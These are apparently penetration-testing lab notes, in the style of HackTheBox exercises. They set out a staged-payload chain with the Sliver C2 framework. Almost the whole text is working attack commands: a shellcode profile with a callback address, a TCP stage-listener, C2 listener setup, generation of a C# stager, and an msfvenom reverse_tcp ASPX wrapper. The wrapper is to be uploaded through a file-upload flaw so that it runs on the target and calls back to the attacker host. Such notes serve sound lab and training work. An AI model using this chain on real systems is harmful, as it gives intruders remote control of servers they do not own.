# 15.25 Staged Payloads

> Chain profile → stage-listener (TCP shellcode) → small stager loader for staged delivery; wrap in msfvenom `.aspx` for upload exploits.

## Overview

Staged delivery uses a three-part chain: a profile defines the final implant, a stage-listener hosts the shellcode over TCP, and a stager generates a small first-stage loader. An msfvenom .aspx wrapper can load the C# stager via an upload vulnerability.

## Steps

- Create a profile with `profiles new` specifying format and callback URL.
- Start a TCP stage-listener pointing at the profile; Sliver auto-compiles the shellcode stage.
- Start an HTTP listener for the beacon's C2 callback channel.
- Generate the stager shellcode with `generate stager --format csharp`.
- Optionally generate an msfvenom ASPX wrapper; replace its byte array with stager bytes.
- Upload the ASPX to a web app with unrestricted file upload to trigger execution.

## Commands

### Create shellcode profile

```text
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb
```

### Start TCP stage-listener

```text
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb
```

### Start HTTP C2 listener

```text
sliver > http -L 10.10.14.62 -l 8088
```

### Generate C# stager

```text
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

### msfvenom ASPX wrapper

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx
```
